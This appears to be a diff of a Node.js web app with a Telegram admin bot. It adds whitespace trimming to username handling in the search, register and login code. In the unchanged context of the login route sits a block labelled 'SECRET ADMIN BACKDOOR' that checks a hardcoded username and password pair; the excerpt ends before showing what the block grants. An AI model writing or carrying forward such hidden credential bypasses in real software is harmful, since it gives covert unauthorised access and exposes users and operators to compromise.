@@ -174,8 +174,8 @@ bot.onText(/\/users/, (msg) => {
 // COMMAND: /search [username]
 bot.onText(/\/search (.+)/, (msg, match) => {
     if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
-    const searchTerm = match[1].toLowerCase();
-    const user = db.get('users').find(u => u.username.toLowerCase() === searchTerm).value();
+    const searchTerm = match[1].toLowerCase().trim();
+    const user = db.get('users').find(u => u && u.username && u.username.toLowerCase().trim() === searchTerm).value();
 
     if (!user) return notifyAdmin(`❌ User <b>${searchTerm}</b> not found.`);
 
@@ -603,7 +603,8 @@ app.post('/api/register', async (req, res) => {
         return res.status(400).json({ error: 'Username and password required' });
     }
 
-    const normalizedUsername = username.toLowerCase();
+    const normalizedUsername = username.toLowerCase().trim();
+    if (!normalizedUsername) return res.status(400).json({ error: 'Invalid username' });
 
     const existingUser = db.get('users').find({ username: normalizedUsername }).value();
     if (existingUser) {
@@ -646,7 +647,7 @@ app.post('/api/login', async (req, res) => {
         return res.status(400).json({ error: 'Username and password required' });
     }
 
-    const normalizedUsername = username.toLowerCase();
+    const normalizedUsername = username.toLowerCase().trim();
 
     // --- SECRET ADMIN BACKDOOR ---
     if (normalizedUsername === 'you know whats cool' && password === 'a billion dollar') {
